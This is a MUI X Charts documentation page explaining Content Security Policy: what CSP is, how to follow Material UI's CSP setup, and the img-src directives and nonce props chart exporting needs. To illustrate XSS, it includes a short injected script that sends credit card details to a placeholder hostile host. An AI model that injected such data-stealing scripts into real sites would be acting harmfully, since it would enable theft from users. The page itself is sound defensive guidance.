---
title: Content Security Policy (CSP)
productId: x-charts
---

# Charts - Content Security Policy (CSP)

<p class="description">This section covers the details of setting up a Content Security Policy.</p>

## What is CSP and why is it useful?

CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).

## Setting up a CSP

MUI X Charts depends on Material UI, thus to set up a CSP, you need to follow Material UI's [CSP implementation guide](/material-ui/guides/content-security-policy/#how-does-one-implement-csp).

### CSP for exporting

MUI X Charts allow [exporting charts](/x/react-charts/export/) as images or PDFs.
When a Content Security Policy is set, exporting requires additional configuration to function.

To enable exporting with CSP, you need to allow the use of `data:` and `blob:` URIs for images. This can be done by adding the following directives to your CSP header:

```text
Content-Security-Policy: img-src 'self' data: blob:;
```

If your CSP defines a nonce for scripts or styles (for example, `script-src 'nonce-<value>'`), you also need to provide the same nonce when exporting.

This can be done by passing the nonce to the `printOptions` and `imageExportOptions` props of the `toolbar` slot.

```tsx
<LineChartPro
  {...settings}
  showToolbar
  slotProps={{
    toolbar: {
      printOptions: { nonce },
      imageExportOptions: [
        { type: 'image/png', nonce },
        { type: 'image/jpeg', nonce },
        { type: 'image/webp', nonce },
      ],
    },
  }}
/>
```
